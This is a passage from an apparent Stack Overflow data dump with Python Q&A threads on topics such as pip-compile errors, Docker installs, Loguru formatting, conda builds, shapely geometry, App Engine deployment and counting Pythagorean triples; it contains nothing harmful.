<p>Just to verify that the line color is the same as the background color using plotly version <code>5.4.0</code></p>
<h3>Plot 1:</h3>
<p><a href=""https://i.stack.imgur.com/37EsP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/37EsP.png"" alt=""enter image description here"" /></a></p>
<h3>Plot 2: Zoomed in</h3>
<p><a href=""https://i.stack.imgur.com/mJZGn.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/mJZGn.png"" alt=""enter image description here"" /></a></p>
"
"70946286","1","pip-compile raising AssertionError on its logging handler","<p>I have a dockerfile that currently only installs pip-tools</p>
<pre><code>FROM python:3.9

RUN pip install --upgrade pip &amp;&amp; \
    pip install pip-tools

COPY ./ /root/project

WORKDIR /root/project

ENTRYPOINT [&quot;tail&quot;, &quot;-f&quot;, &quot;/dev/null&quot;]
</code></pre>
<p>I build and open a shell in the container using the following commands:</p>
<pre><code>docker build -t brunoapi_image .
docker run --rm -ti --name brunoapi_container --entrypoint bash brunoapi_image
</code></pre>
<p>Then, when I try to run <code>pip-compile</code> inside the container I get this very weird error (full traceback):</p>
<pre><code>root@727f1f38f095:~/project# pip-compile
Traceback (most recent call last):
  File &quot;/usr/local/bin/pip-compile&quot;, line 8, in &lt;module&gt;
    sys.exit(cli())
  File &quot;/usr/local/lib/python3.9/site-packages/click/core.py&quot;, line 1128, in __call__
    return self.main(*args, **kwargs)
  File &quot;/usr/local/lib/python3.9/site-packages/click/core.py&quot;, line 1053, in main
    rv = self.invoke(ctx)
  File &quot;/usr/local/lib/python3.9/site-packages/click/core.py&quot;, line 1395, in invoke
    return ctx.invoke(self.callback, **ctx.params)
  File &quot;/usr/local/lib/python3.9/site-packages/click/core.py&quot;, line 754, in invoke
    return __callback(*args, **kwargs)
  File &quot;/usr/local/lib/python3.9/site-packages/click/decorators.py&quot;, line 26, in new_func
    return f(get_current_context(), *args, **kwargs)
  File &quot;/usr/local/lib/python3.9/site-packages/piptools/scripts/compile.py&quot;, line 342, in cli
    repository = PyPIRepository(pip_args, cache_dir=cache_dir)
  File &quot;/usr/local/lib/python3.9/site-packages/piptools/repositories/pypi.py&quot;, line 106, in __init__
    self._setup_logging()
  File &quot;/usr/local/lib/python3.9/site-packages/piptools/repositories/pypi.py&quot;, line 455, in _setup_logging
    assert isinstance(handler, logging.StreamHandler)
AssertionError
</code></pre>
<p>I have no clue what's going on and I've never seen this error before. Can anyone shed some light into this?</p>
<p>Running on macOS Monterey</p>
","70999908","<p>It is a bug, you can downgrade using:</p>
<p><code>pip install &quot;pip&lt;22&quot;</code></p>
<p><a href=""https://github.com/jazzband/pip-tools/issues/1558"" rel=""noreferrer"">https://github.com/jazzband/pip-tools/issues/1558</a></p>
"
"70587544","1","""brew install python"" installs 3.9. Why not 3.10?","<p>My understanding is that &quot;brew install python&quot; installs the latest version of python. Why isn't it pulling 3.10? 3.10 is marked as a stable release.</p>
<p>I can install 3.10 with &quot;brew install python@3.10 just fine and can update my PATH so that python and pip point to the right versions. But I am curious why &quot;brew install python&quot; its not installing 3.10.</p>
<p>My other understanding is that 3.10 is directly compatible with the M1 chips so that is why I want 3.10.</p>
<p>Please let me know if I am mistaken.</p>
","70589077","<p>As Henry Schreiner have specified now Python 3.10 is the new default in Brew. Thx for pointing it</p>
<p>--- Obsolete ---
The &quot;python3&quot; formula is still 3.9 in the brew system
check the doc here:
<a href=""https://formulae.brew.sh/formula/python@3.9#default"" rel=""nofollow noreferrer"">https://formulae.brew.sh/formula/python@3.9#default</a></p>
<p>The latest version of the formula for 3.9 also support apple silicon.</p>
<p>If you want to use python3.10 you need to run as you described brew install python@3.10</p>
<p>The reason why 3.9 is still the official python3 formula is that generally user using the vanilla python3 are not looking for the latest revision but the more stable. in some months the transition will done.</p>
"
"70977165","1","How to use Loguru defaults + and extra information?","<p>I'm still reaseaching about Loguru, but I can't find an easy way to do this. I want to use the default options from Loguru, I believe they  are great, but I want to add information to it, I want to add the IP of a request that will be logged.</p>
<p>If I try this:</p>
<pre><code>import sys
from loguru import logger
logger.info(&quot;This is log info!&quot;)
# This is directle from Loguru page
logger.add(sys.stderr, format=&quot;{extra[ip]} {extra[user]} {message}&quot;)
context_logger = logger.bind(ip=&quot;192.168.0.1&quot;, user=&quot;someone&quot;)
context_logger.info(&quot;Contextualize your logger easily&quot;)
context_logger.bind(user=&quot;someone_else&quot;).info(&quot;Inline binding of extra attribute&quot;)
context_logger.info(&quot;Use kwargs to add context during formatting: {user}&quot;, user=&quot;anybody&quot;)
</code></pre>
<p>That logs this:
<a href=""https://i.stack.imgur.com/1yVgp.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/1yVgp.png"" alt=""enter image description here"" /></a></p>
<p>I know that with <code>logger.remove(0)</code> I will remove the default logs, but I want to use it to obtain something like this: <code>2022-02-03 15:16:54.920 | INFO     | __main__:&lt;module&gt;:79 - XXX.XXX.XX.X - Use kwargs to add context during formatting: anybody</code>, with XXX.XXX.XX.X  being the IP. Using the default config (for color and the rest of thing) and adding a little thing to the format.</p>
<p>I'm trying to access the default configs, but I haven't been able to import them and use them with <code>logger.add</code>. I think I will have to configure everything from scratch.</p>
<p>Hope someone can help me, thanks.</p>
","71008024","<p>I made the same question in the <a href=""https://github.com/Delgan/loguru/issues/586"" rel=""noreferrer"">Github Repository</a> and this was the answer by Delgan (Loguru maintainer):</p>
<p>I think you simply need to <code>add()</code> your handler using a custom format containing the extra information. Here is an example:</p>
<pre><code>logger_format = (
    &quot;&lt;green&gt;{time:YYYY-MM-DD HH:mm:ss.SSS}&lt;/green&gt; | &quot;
    &quot;&lt;level&gt;{level: &lt;8}&lt;/level&gt; | &quot;
    &quot;&lt;cyan&gt;{name}&lt;/cyan&gt;:&lt;cyan&gt;{function}&lt;/cyan&gt;:&lt;cyan&gt;{line}&lt;/cyan&gt; | &quot;
    &quot;{extra[ip]} {extra[user]} - &lt;level&gt;{message}&lt;/level&gt;&quot;
)
logger.configure(extra={&quot;ip&quot;: &quot;&quot;, &quot;user&quot;: &quot;&quot;})  # Default values
logger.remove()
logger.add(sys.stderr, format=logger_format)
</code></pre>
<p>Extra: if you want to use TRACE level use this when adding the configurations:</p>
<p><code>logger.add(sys.stderr, format=logger_format, level=&quot;TRACE&quot;)</code></p>
"
"70610919","1","Installing python in Dockerfile without using python image as base","<p>I have a python script that uses DigitalOcean tools (doctl and kubectl) I want to containerize. This means my container will need python, doctl, and kubectl installed. The trouble is, I figure out how to install both python and DigitalOcean tools in the dockerfile.</p>
<p>I can install python using the base image &quot;python:3&quot; and I can also install the DigitalOcean tools using the base image &quot;alpine/doctl&quot;. However, the rule is you can only use one base image in a dockerfile.</p>
<p>So I can include the python base image and install the DigitalOcean tools another way:</p>
<pre><code>FROM python:3
RUN &lt;somehow install doctl and kubectl&gt;
RUN pip install firebase-admin
COPY script.py
CMD [&quot;python&quot;, &quot;script.py&quot;]
</code></pre>
<p>Or I can include the alpine/doctl base image and install python3 another way.</p>
<pre><code>FROM alpine/doctl
RUN &lt;somehow install python&gt;
RUN pip install firebase-admin
COPY script.py
CMD [&quot;python&quot;, &quot;script.py&quot;]
</code></pre>
<p>Unfortunately, I'm not sure how I would do this. Any help in how I can get all these tools installed would be great!</p>
","70611018","<p>just add this with any other thing you want to <code>apt-get install</code>:</p>
<pre><code>RUN apt-get update &amp;&amp; apt-get install -y \
    python3.6 &amp;&amp;\
    python3-pip &amp;&amp;\
</code></pre>
<p>in alpine it should be something like:</p>
<pre><code>RUN apk add --update --no-cache python3 &amp;&amp; ln -sf python3 /usr/bin/python &amp;&amp;\
    python3 -m ensurepip &amp;&amp;\
    pip3 install --no-cache --upgrade pip setuptools &amp;&amp;\
</code></pre>
"
"70934699","1","How to fix error when building conda package related to ""Icon"" file?","<p>I honestly can't figure out what is happening with this error. I thought it was something in my manifest file but apparently it's not.</p>
<p>Note, this directory is in my Google Drive.</p>
<p>Here is my <code>MANIFEST.in</code> file:</p>
<pre><code>graft soothsayer_utils
include setup.py
include LICENSE.txt
include README.md
global-exclude Icon*
global-exclude *.py[co]
global-exclude .DS_Store
</code></pre>
<p>I'm running <code>conda build .</code> in the directory and get the following error:</p>
<pre><code>Packaging soothsayer_utils
INFO:conda_build.build:Packaging soothsayer_utils
INFO conda_build.build:build(2214): Packaging soothsayer_utils
Packaging soothsayer_utils-2022.01.19-py_0
INFO:conda_build.build:Packaging soothsayer_utils-2022.01.19-py_0
INFO conda_build.build:bundle_conda(1454): Packaging soothsayer_utils-2022.01.19-py_0
number of files: 11
Fixing permissions
Packaged license file/s.
INFO :: Time taken to mark (prefix)
        0 replacements in 0 files was 0.11 seconds
'site-packages/soothsayer_utils-2022.1.19.dist-info/Icon' not in tarball
'site-packages/soothsayer_utils-2022.1.19.dist-info/Icon\r' not in info/files
Traceback (most recent call last):
  File &quot;/Users/jespinoz/anaconda3/bin/conda-build&quot;, line 11, in &lt;module&gt;
    sys.exit(main())
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/cli/main_build.py&quot;, line 474, in main
    execute(sys.argv[1:])
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/cli/main_build.py&quot;, line 463, in execute
    outputs = api.build(args.recipe, post=args.post, test_run_post=args.test_run_post,
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/api.py&quot;, line 186, in build
    return build_tree(
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py&quot;, line 3008, in build_tree
    packages_from_this = build(metadata, stats,
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py&quot;, line 2291, in build
    newly_built_packages = bundlers[pkg_type](output_d, m, env, stats)
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/build.py&quot;, line 1619, in bundle_conda
    tarcheck.check_all(tmp_path, metadata.config)
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py&quot;, line 89, in check_all
    x.info_files()
  File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py&quot;, line 53, in info_files
    raise Exception('info/files')
Exception: info/files
</code></pre>
<p>Here's the <a href=""https://pastebin.com/raw/YRGShvCy"" rel=""noreferrer"">complete log</a></p>
<p>I can confirm that the <code>Icon</code> files do not exist in my <a href=""https://github.com/jolespin/soothsayer_utils/releases/download/v2022.01.19/soothsayer_utils-2022.1.19.tar.gz"" rel=""noreferrer"">soothsayer_utils-2022.1.19.tar.gz</a> file:</p>
<pre><code>(base) jespinoz@x86_64-apple-darwin13 Downloads % tree soothsayer_utils-2022.1.19
soothsayer_utils-2022.1.19
├── LICENSE.txt
├── MANIFEST.in
├── PKG-INFO
├── README.md
├── setup.cfg
├── setup.py
├── soothsayer_utils
│   ├── __init__.py
│   └── soothsayer_utils.py
└── soothsayer_utils.egg-info
    ├── PKG-INFO
    ├── SOURCES.txt
    ├── dependency_links.txt
    ├── requires.txt
    └── top_level.txt

2 directories, 13 files
</code></pre>
<p><strong>Can someone help me get <code>conda build</code> to work for my package?</strong></p>
","71020880","<p>there are a few symptoms I would like to suggest looking into:</p>
<ol>
<li>There is a WARNING in your error log <code>SetuptoolsDeprecationWarning: setup.py install is deprecated. Use build and pip and other standards-based tools</code>. You have <code>MANIFEST.in</code>, <code>setup.py</code> and <code>setup.cfg</code> probably conflicting between them. Because <code>setup.py</code> is the build script for setuptools. It tells <code>setuptools</code> about your package (such as the name and version) as well as which code files to include. Also, An existing generated MANIFEST will be regenerated without sdist comparing its modification time to the one of MANIFEST.in or setup.py, as explained <a href=""https://docs.python.org/3.8/distutils/sourcedist.html"" rel=""nofollow noreferrer"">here</a>.</li>
</ol>
<blockquote>
<p>Please refer to <a href=""https://setuptools.pypa.io/en/latest/setuptools.html#"" rel=""nofollow noreferrer"">Building and Distributing Packages with Setuptools</a>, also <a href=""https://setuptools.pypa.io/en/latest/userguide/declarative_config.html"" rel=""nofollow noreferrer"">Configuring setup() using setup.cfg files</a> and <a href=""https://setuptools.pypa.io/en/latest/userguide/quickstart.html"" rel=""nofollow noreferrer"">Quickstart</a> for more information</p>
</blockquote>
<ol start=""2"">
<li>Maybe not so important, but another thing worth looking into is the fact that there are 2 different python distributions being used at different stages, as Python 3.10 is used at: <code>Using pip 22.0.2 from $PREFIX/lib/python3.10/site-packages/pip (python 3.10)</code> (it is also in your conda dependencies) and Python 3.8 is used at: <code>File &quot;/Users/jespinoz/anaconda3/lib/python3.8/site-packages/conda_build/tarcheck.py&quot;, line 53, in info_files raise Exception('info/files')</code> which is where the error happens. So maybe another configuration conflict related to this.</li>
</ol>
"
"71053839","1","VSCode Jupyter not connecting to python kernel","<p>Launching a cell will make this message appear: <code>Connecting to kernel: Python 3.9.6 64-bit: Activating Python Environment 'Python 3.9.6 64-bit'</code>. This message will then stay up loading indefinitely, without anything happening. No actual error message.</p>
<p>I've already tried searching for this problem, but every other post seem to obtain at least an error message, which isn't the case here. I still looked at some of these, which seemed to indicate the problem might have come from the <code>traitlets</code> package. I tried to downgrade it to what was recommended, but it didn't solve anything, so I reverted the downgrade.</p>
<p>The main problem here is that I have no idea what could cause such a problem, without even an error message. If you think additional info could help, please do ask, I have no idea what could be of use right now.</p>
","71092223","<p>Not sure what did the trick but downgrading VSCode to <a href=""https://code.visualstudio.com/updates/v1_63"" rel=""noreferrer"">November version</a> and after that reinstalling Jupyter extension worked for me.</p>
"
"70626218","1","how to find the nearest LINESTRING to a POINT?","<p>How do I fund the nearest LINESTRING near a point?</p>
<p>First I have a list of LINESTRING and point value. How do I have the nearest LINESTRING to the POINT (5.41 3.9) and maybee the distance?</p>
<pre><code>from shapely.geometry import Point, LineString

line_string = [LINESTRING (-1.15.12 9.9, -1.15.13 9.93), LINESTRING (-2.15.12 8.9, -2.15.13 8.93)]
point = POINT (5.41 3.9)

#distance 
line_string [0].distance(point)
</code></pre>
<p>So far I think I got the distance value by doing line_string [0].distance(point) for the first LINESTRING so far but I just want to make sure I am going about it the right way.</p>
","70627012","<ul>
<li>your sample geometry is invalid for line strings, have modified</li>
<li>it's simple to achieve with <code>sjoin_nearest()</code></li>
</ul>
<pre><code>import geopandas as gpd
import shapely.wkt
import shapely.geometry

line_string = [&quot;LINESTRING (-1.15.12 9.9, -1.15.13 9.93)&quot;, &quot;LINESTRING (-2.15.12 8.9, -2.15.13 8.93)&quot;]
# fix invalid wkt string...
line_string = [&quot;LINESTRING (-1.15 9.9, -1.15 9.93)&quot;, &quot;LINESTRING (-2.15 8.9, -2.15 8.93)&quot;]
point = &quot;POINT (5.41 3.9)&quot;

gdf_p = gpd.GeoDataFrame(geometry=[shapely.wkt.loads(point)])
gdf_l = gpd.GeoDataFrame(geometry=pd.Series(line_string).apply(shapely.wkt.loads))

df_n = gpd.sjoin_nearest(gdf_p, gdf_l).merge(gdf_l, left_on=&quot;index_right&quot;, right_index=True)

df_n[&quot;distance&quot;] = df_n.apply(lambda r: r[&quot;geometry_x&quot;].distance(r[&quot;geometry_y&quot;]), axis=1)

df_n

</code></pre>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
<th style=""text-align: right;""></th>
<th style=""text-align: left;"">geometry_x</th>
<th style=""text-align: right;"">index_right</th>
<th style=""text-align: left;"">geometry_y</th>
<th style=""text-align: right;"">distance</th>
</tr>
</thead>
<tbody>
<tr>
<td style=""text-align: right;"">0</td>
<td style=""text-align: left;"">POINT (5.41 3.9)</td>
<td style=""text-align: right;"">0</td>
<td style=""text-align: left;"">LINESTRING (-1.15 9.9, -1.15 9.93)</td>
<td style=""text-align: right;"">8.89008</td>
</tr>
</tbody>
</table>
</div><h3>distance in meters</h3>
<ul>
<li>use a CRS that is in meters.  UTM has it's limitations if all points are not in same zone</li>
</ul>
<pre><code>import geopandas as gpd
import shapely.wkt
import shapely.geometry

line_string = [&quot;LINESTRING (-1.15.12 9.9, -1.15.13 9.93)&quot;, &quot;LINESTRING (-2.15.12 8.9, -2.15.13 8.93)&quot;]
# fix invalid wkt string...
line_string = [&quot;LINESTRING (-1.15 9.9, -1.15 9.93)&quot;, &quot;LINESTRING (-2.15 8.9, -2.15 8.93)&quot;]
point = &quot;POINT (5.41 3.9)&quot;

gdf_p = gpd.GeoDataFrame(geometry=[shapely.wkt.loads(point)], crs=&quot;epsg:4326&quot;)
gdf_l = gpd.GeoDataFrame(geometry=pd.Series(line_string).apply(shapely.wkt.loads), crs=&quot;epsg:4326&quot;)
gdf_p = gdf_p.to_crs(gdf_p.estimate_utm_crs())
gdf_l = gdf_l.to_crs(gdf_p.crs)


df_n = gpd.sjoin_nearest(gdf_p, gdf_l).merge(gdf_l, left_on=&quot;index_right&quot;, right_index=True)

df_n[&quot;distance&quot;] = df_n.apply(lambda r: r[&quot;geometry_x&quot;].distance(r[&quot;geometry_y&quot;]), axis=1)

df_n
</code></pre>
"
"70602290","1","Google app engine deployment fails- Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')","<p>We are using command prompt <code>c:\gcloud app deploy app.yaml</code>, but get the following error:</p>
<pre><code>Running &quot;python3 -m pip install --requirement requirements.txt --upgrade --upgrade-strategy only-if-needed --no-warn-script-location --no-warn-conflicts --force-reinstall --no-compile (PIP_CACHE_DIR=/layers/google.python.pip/pipcache PIP_DISABLE_PIP_VERSION_CHECK=1)&quot;
Step #2 - &quot;build&quot;: /layers/google.python.pip/pip/bin/python3: Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')
Step #2 - &quot;build&quot;: Done &quot;python3 -m pip install --requirement requirements.txt --upgr...&quot; (34.49892ms)
Step #2 - &quot;build&quot;: Failure: (ID: 0ea8a540) /layers/google.python.pip/pip/bin/python3: Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')
Step #2 - &quot;build&quot;: --------------------------------------------------------------------------------
Step #2 - &quot;build&quot;: Running &quot;mv -f /builder/outputs/output-5577006791947779410 /builder/outputs/output&quot;
Step #2 - &quot;build&quot;: Done &quot;mv -f /builder/outputs/output-5577006791947779410 /builder/o...&quot; (12.758866ms)
Step #2 - &quot;build&quot;: ERROR: failed to build: exit status 1
Finished Step #2 - &quot;build&quot;
ERROR
ERROR: build step 2 &quot;us.gcr.io/gae-runtimes/buildpacks/python37/builder:python37_20211201_3_7_12_RC00&quot; failed: step exited with non-zero status: 145
</code></pre>
<p>Our Requirements.txt is as below. We are currently on Python 3.7 standard app engine</p>
<pre><code>firebase_admin==3.0.0
sendgrid==6.9.3
google-auth==1.35.0
google-auth-httplib2==0.1.0
jinja2==3.0.3
MarkupSafe==2.0.1
pytz==2021.3
Flask==2.0.2
twilio==6.46.0
httplib2==0.20.2
requests==2.24.0
requests_toolbelt==0.9.1
google-cloud-tasks==2.7.1
google-cloud-logging==1.15.1
googleapis-common-protos==1.54.0
</code></pre>
<p>Please help.The above code was working well before updating the requirements.txt file. We tried to remove gunicorn to allow the system pickup the latest according to documentation <a href=""https://cloud.google.com/build/docs/view-build-results#viewing_build_results"" rel=""noreferrer"">here</a>.</p>
<p>We have a subdirectory structure that stores all the .py files in controllers and db definitions in models. Our main.py has the following -</p>
<pre><code>sys.path.append(os.path.join(os.path.dirname(__file__), '../controllers'))
sys.path.append(os.path.join(os.path.dirname(__file__), '../models'))
</code></pre>
<p>Does anyone know how to debug this error -  <code>Error while finding module specification for 'pip' (AttributeError: module '__main__' has no attribute '__file__')</code>. What does this mean?</p>
","70619556","<p>I had the same issue when deploying a Google Cloud Function. The error</p>
<blockquote>
<p>cloud function Error while finding module specification for 'pip' (AttributeError: module '<strong>main</strong>' has no attribute '<strong>file</strong>'); Error ID: c84b3231</p>
</blockquote>
<p>appeared after commenting out some packages in the requirements.txt, but that was nothing important and likely did not cause it. I guess that it is more a problem of an <strong>instability in Google Storage</strong>, since that same Cloud Function I was working on had lost its archive already some time before, all of a sudden, out of nowhere, showing:</p>
<blockquote>
<p>Archive not found in the storage location cloud function</p>
</blockquote>
<p>and I did not delete or change anything that might explain this, as <a href=""https://stackoverflow.com/questions/65348509/archive-not-found-in-the-storage-location-google-function"">Archive not found in the storage location: Google Function</a> would suggest. <em>Though that answer has one very interesting guess that might explain at least the very first time the &quot;Archive not found&quot; error came up and thus made the CF instable: I might have changed the timezone city of the bucket during browsing the Google Storage. It is too long ago, but I know I browsed the GS, therefore, I cannot exclude this. Quote: &quot;It [the Archive not found error] may occurr too if GCS bucket's region is not matched to your Cloud function region.&quot;</em></p>
<p>After this &quot;Archive not found&quot; crash, I manually added <code>main.py</code> and <code>requirements.txt</code> and filled them again with code from the backup. This worked for some time, but there seems to be some general instability in the Google Storage. Therefore, always keep backups of your deployed scripts.</p>
<p>Then, after getting this <code>pip</code> error of the question in that already instable Cloud Function, waiting for a day or two, Google Function again showed</p>
<blockquote>
<p>Archive not found in the storage location cloud function</p>
</blockquote>
<p>If you run into this <code>pip</code> error in a Cloud Function, you might consider <a href=""https://stackoverflow.com/questions/49839610/attributeerror-module-pip-has-no-attribute-main"">updating <code>pip</code> in the &quot;requirements.txt&quot;</a> but if you are in such an unstable Cloud Function the better workaround seems to be to <strong>create a new Cloud Function and copy everything in there.</strong></p>
<p>The <code>pip</code> error probably just shows that the source script, in this case the <code>requirements.txt</code>, cannot be run since the source code is not fully embedded anymore or has lost some embedding in the Google Storage.</p>
<p>Or you give that Cloud Function a second chance and <code>edit</code>, go to <code>Source</code> tab, click on Dropdown <code>Source code</code> to choose <code>Inline Editor</code> and add <code>main.py</code> and <code>requirements.txt</code> manually (<code>Runtime</code>: Python).</p>
<p><a href=""https://i.stack.imgur.com/ELyTf.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ELyTf.png"" alt=""enter image description here"" /></a></p>
"
"70680363","1","Structural pattern matching using regex","<p>I have a string that I'm trying to validate against a few regex patterns and I was hoping since Pattern matching is available in 3.10, I might be able to use that instead of creating an if-else block.</p>
<p>Consider a string 'validateString' with possible values 1021102,1.25.32, string021.</p>
<p>The code I tried would be something like the following.</p>
<pre><code>match validateString:
    case regex1:
        print('Matched regex1')
    case regex2:
        print('Matched regex2')
    case regex3:
        print('Matched regex3')
</code></pre>
<p>For regex 1, 2 and 3, I've tried string regex patterns and also re.compile objects but it doesn't seem to work.</p>
<p>I have been trying to find examples of this over the internet but can't seem to find any that cover regex pattern matching with the new python pattern matching.</p>
<p>Any ideas for how I can make it work?</p>
<p>Thanks!</p>
","70680526","<p>It is not possible to use regex-patterns to match via structural pattern matching (at this point in time).</p>
<p>From: <a href=""https://docs.python.org/3/whatsnew/3.10.html#pep-634-structural-pattern-matching"" rel=""nofollow noreferrer"">PEP0643: structural-pattern-matching</a></p>
<blockquote>
<p><strong>PEP 634: Structural Pattern Matching</strong><br />
Structural pattern matching has been added in the form of a match statement and case statements of patterns with associated actions. <strong>Patterns</strong> consist of <strong>sequences, mappings, primitive data types</strong> as well as <strong>class instances</strong>. Pattern matching enables programs to extract information from complex data types, branch on the structure of data, and apply specific actions based on different forms of data. (<em>emphasis mine</em>)</p>
</blockquote>
<p>Nothing in this gives any hint that evoking match / search functions of the <code>re</code> module on the provided pattern is intended to be used for matching.</p>
<hr />
<p>You can find out more about the reasoning behind strucutral pattern matching by reading the actuals PEPs:</p>
<ul>
<li><a href=""http://python.org/dev/peps/pep-0634"" rel=""nofollow noreferrer"">PEP 634 -- Structural Pattern Matching: Specification</a></li>
<li><a href=""http://python.org/dev/peps/pep-0635"" rel=""nofollow noreferrer"">PEP 635 -- Structural Pattern Matching: Motivation and Rationale</a></li>
<li><a href=""http://python.org/dev/peps/pep-0636"" rel=""nofollow noreferrer"">PEP 636 -- Structural Pattern Matching: Tutorial</a></li>
</ul>
<p>they also include ample examples on how to use it.</p>
"
"70573108","1","Speeding up the loops or different ideas for counting primitive triples","<pre><code>def pythag_triples(n):
    i = 0
    start = time.time()
    for x in range(1, int(sqrt(n) + sqrt(n)) + 1, 2):
        for m in range(x+2,int(sqrt(n) + sqrt(n)) + 1, 2):
            if gcd(x, m) == 1:
                # q = x*m
                # l = (m**2 - x**2)/2
                c = (m**2 + x**2)/2
                # trips.append((q,l,c))
                if c &lt; n:
                    i += 1
    end = time.time()
    return i, end-start
print(pythag_triples(3141592653589793))
</code></pre>
<p>I'm trying to calculate primitive pythagorean triples using the idea that all triples are generated from using m, n that are both odd and coprime. I already know that the function works up to 1000000 but when doing it to the larger number its taken longer than 24 hours. Any ideas on how to speed this up/ not brute force it. I am trying to count the triples.</p>
","70661056","<p>This new answer brings the total time for <code>big_n</code> down to <strong>4min 6s</strong>.</p>
<p>An profiling of my <a href=""https://stackoverflow.com/a/70575747/758174"">initial answer</a> revealed these facts:</p>
<ul>
<li>Total time: 1h 42min 33s</li>
<li>Time spent factorizing numbers: almost 100% of the time</li>
</ul>
<p>In contrast, generating all primes from <code>3</code> to <code>sqrt(2*N - 1)</code> takes only <strong>38.5s</strong> (using Atkin's sieve).</p>
<p>I therefore decided to try a version where we generate all numbers <code>m</code> as known products of prime numbers. That is, the generator yields the number itself as well as the distinct prime factors involved. No factorization needed.</p>
<p><s>The result is still <code>500_000_000_002_841</code>, off by 4 as @Koder noticed. I do not know yet where that problem comes from</s>. <strong>Edit</strong>: after correction of the <code>xmax</code> bound (<code>isqrt(2*N - m**2)</code> instead of <code>isqrt(2*N - m**2 - 1)</code>, since we <em>do</em> want to include triangles with hypothenuse <em>equal</em> to <code>N</code>), we now get the correct result.</p>
<p>The code for the primes generator is included at the end. Basically, I used <a href=""http://en.wikipedia.org/wiki/Prime_number"" rel=""nofollow noreferrer"">Atkin's sieve</a>, adapted (without spending much time on it) to Python. I am quite sure it could be sped up (e.g. using <code>numpy</code> and perhaps even <code>numba</code>).</p>
<p>To generate integers from primes (which we know we can do thanks to the <a href=""https://en.wikipedia.org/wiki/Fundamental_theorem_of_arithmetic"" rel=""nofollow noreferrer"">Fundamental theorem of arithmetic</a>), we just need to iterate through all the possible products <code>prod(p_i**k_i)</code> where <code>p_i</code> is the <code>i^th</code> prime number and <code>k_i</code> is any non-negative integer.</p>
<p>The easiest formulation is a recursive one:</p>
<pre class=""lang-py prettyprint-override""><code>def gen_ints_from_primes(p_list, upto):
    if p_list and upto &gt;= p_list[0]:
        p, *p_list = p_list
        pk = 1
        p_tup = tuple()
        while pk &lt;= upto:
            for q, p_distinct in gen_ints_from_primes(p_list, upto=upto // pk):
                yield pk * q, p_tup + p_distinct
            pk *= p
            p_tup = (p, )
    else:
        yield 1, tuple()
</code></pre>
<p>Unfortunately, we quickly run into memory constraints (and recursion limit). So here is a non-recursive version which uses no extra memory aside from the list of primes themselves. Essentially, the current value of <code>q</code> (the integer in process of being generated) and an index in the list are all the information we need to generate the next integer. Of course, the values come unsorted, but that doesn't matter, as long as they are all covered.</p>
<pre class=""lang-py prettyprint-override""><code>def rem_p(q, p, p_distinct):
    q0 = q
    while q % p == 0:
        q //= p
    if q != q0:
        if p_distinct[-1] != p:
            raise ValueError(f'rem({q}, {p}, ...{p_distinct[-4:]}): p expected at end of p_distinct if q % p == 0')
        p_distinct = p_distinct[:-1]
    return q, p_distinct

def add_p(q, p, p_distinct):
    if len(p_distinct) == 0 or p_distinct[-1] != p:
        p_distinct += (p, )
    q *= p
    return q, p_distinct

def gen_prod_primes(p, upto=None):
    if upto is None:
        upto = p[-1]
    if upto &gt;= p[-1]:
        p = p + [upto + 1]  # sentinel
    
    q = 1
    i = 0
    p_distinct = tuple()
    
    while True:
        while q * p[i] &lt;= upto:
            i += 1
        while q * p[i] &gt; upto:
            yield q, p_distinct
            if i &lt;= 0:
                return
            q, p_distinct = rem_p(q, p[i], p_distinct)
            i -= 1
        q, p_distinct = add_p(q, p[i], p_distinct)
</code></pre>
<p>Example-</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; p_list = list(primes(20))
&gt;&gt;&gt; p_list
[2, 3, 5, 7, 11, 13, 17, 19]

&gt;&gt;&gt; sorted(gen_prod_primes(p_list, 20))
[(1, ()),
 (2, (2,)),
 (3, (3,)),
 (4, (2,)),
 (5, (5,)),
 (6, (2, 3)),
 (7, (7,)),
 (8, (2,)),
 (9, (3,)),
 (10, (2, 5)),
 (11, (11,)),
 (12, (2, 3)),
 (13, (13,)),
 (14, (2, 7)),
 (15, (3, 5)),
 (16, (2,)),
 (17, (17,)),
 (18, (2, 3)),
 (19, (19,)),
 (20, (2, 5))]
</code></pre>
<p>As you can see, we don't need to factorize any number, as they conveniently come along with the distinct primes involved.</p>
<p>To get only odd numbers, simply remove <code>2</code> from the list of primes:</p>
<pre class=""lang-py prettyprint-override""><code>&gt;&gt;&gt; sorted(gen_prod_primes(p_list[1:]), 20)
[(1, ()),
 (3, (3,)),
 (5, (5,)),
 (7, (7,)),
 (9, (3,)),
 (11, (11,)),
 (13, (13,)),
 (15, (3, 5)),
 (17, (17,)),
 (19, (19,))]
</code></pre>
<p>In order to exploit this number-and-factors presentation, we need to amend a bit the function given in the original answer:</p>
<pre class=""lang-py prettyprint-override""><code>def phi(n, upto=None, p_list=None):
    # Euler's totient or &quot;phi&quot; function
    if upto is None or upto &gt; n:
        upto = n
    if p_list is None:
        p_list = list(distinct_factors(n))
    if upto &lt; n:
        # custom version: all co-primes of n up to the `upto` bound
        cnt = upto
        for q in products_of(p_list, upto):
            cnt += upto // q if q &gt; 0 else -(upto // -q)
        return cnt
    # standard formulation: all co-primes of n up to n-1
    cnt = n
    for p in p_list:
        cnt = cnt * (p - 1) // p
    return cnt
</code></pre>
<p>With all this, we can now rewrite our counting functions:</p>
<pre class=""lang-py prettyprint-override""><code>def pt_count_m(N):
    # yield tuples (m, count(x) where 0 &lt; x &lt; m and odd(x)
